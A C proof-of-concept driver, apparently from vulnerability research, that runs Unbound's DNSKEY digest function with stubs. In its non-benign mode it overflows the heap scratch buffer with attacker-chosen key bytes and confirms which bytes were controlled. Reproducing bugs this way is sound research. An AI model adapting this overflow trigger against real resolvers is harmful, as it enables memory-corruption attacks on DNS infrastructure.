/* frontier unbound2shell driver: executes the VERBATIM pinned
 * ds_create_dnskey_digest() from validator/val_sigcrypt.c with stubbed
 * collaborators. No resolver, DNS packet or network is involved. */
#include "stubs.h"
#include "gen_func.h"

static uint8_t g_rdata[LDNS_MAX_RDFLEN + 4];
static uint8_t g_dname[LDNS_MAX_DOMAINLEN];
static uint8_t g_digest[64];
static size_t g_dname_len, g_rdata_len;

void rrset_get_rdata(struct ub_packed_rrset_key *k, size_t idx,
	uint8_t **rdata, size_t *len)
{
	(void)k; (void)idx;
	*rdata = g_rdata;
	*len = g_rdata_len;
}

void query_dname_tolower(uint8_t *d) { (void)d; }

int ds_get_digest_algo(struct ub_packed_rrset_key *k, size_t idx)
{
	(void)k; (void)idx;
	return 2; /* LDNS_SHA256 */
}

int secalgo_ds_digest(int algo, unsigned char *data, size_t len,
	unsigned char *digest)
{
	(void)algo; (void)len;
	memcpy(digest, data, 20);
	return 1;
}
static char g_stdout_buf[8192];

int main(int argc, char **argv)
{
	const char *mode = argc > 1 ? argv[1] : "benign";
	struct module_env env;
	struct ub_packed_rrset_key key;
	sldns_buffer *b = sldns_buffer_new(MSG_BUFFER_SIZE);
	int rc;
	size_t written, overflow, j;

	/* No malloc may occur after the overflow: a 236-byte heap overwrite
	 * corrupts glibc's top-chunk metadata and the next malloc aborts
	 * before the chosen bytes can be observed in this lab frame. */
	setvbuf(stdout, g_stdout_buf, _IOFBF, sizeof(g_stdout_buf));

	memset(g_dname, 'a', sizeof(g_dname));
	g_dname_len = strcmp(mode, "benign") == 0 ? 32 : LDNS_MAX_DOMAINLEN;
	g_rdata_len = strcmp(mode, "benign") == 0 ? 100 : LDNS_MAX_RDFLEN;
	memset(g_rdata, 0, sizeof(g_rdata));
	/* Attacker-chosen RDATA public-key bytes: repeating 0x41..0x50. */
	for (j = 0; j < sizeof(g_rdata); j++)
		g_rdata[j] = (uint8_t)(0x41 + (j % 16));

	key.rk.dname = g_dname;
	key.rk.dname_len = g_dname_len;
	env.scratch_buffer = b;
	env.scratch = NULL;

	rc = ds_create_dnskey_digest(&env, &key, 0, &key, 0, g_digest);
	written = g_dname_len + (g_rdata_len - 2);
	overflow = written > b->_capacity ? written - b->_capacity : 0;

	printf("LAYOUT mode=%s cap=%zu dname_len=%zu rdata_len=%zu "
		"written=%zu overflow=%zu rc=%d limit=%zu\n",
		mode, b->_capacity, g_dname_len, g_rdata_len, written, overflow,
		rc, sldns_buffer_limit(b));
	printf("GUARD_REJECTED=%d\n",
		(written > b->_capacity && rc == 0) ? 1 : 0);

#ifndef __SANITIZE_ADDRESS__
	if (overflow > 0) {
		uint8_t *past = b->_data + b->_capacity;
		int match = 1;
		size_t i;
		/* First overflowing byte is source index
		 * (capacity - dname_len) of the rdata+2 stream, i.e. g_rdata
		 * index source + 2 (the rdatalen prefix is skipped). */
		for (i = 0; i < 16; i++) {
			size_t src = (b->_capacity - g_dname_len) + i;
			uint8_t expect = (uint8_t)(0x41 + ((src + 2) % 16));
			if (past[i] != expect) match = 0;
		}
		printf("CHOSEN_MATCH=%d\n", match);
		printf("CHOSEN_BYTES");
		for (i = 0; i < 16; i++) printf(" %02x", past[i]);
		printf("\n");
	}
#endif
	return 0;
}
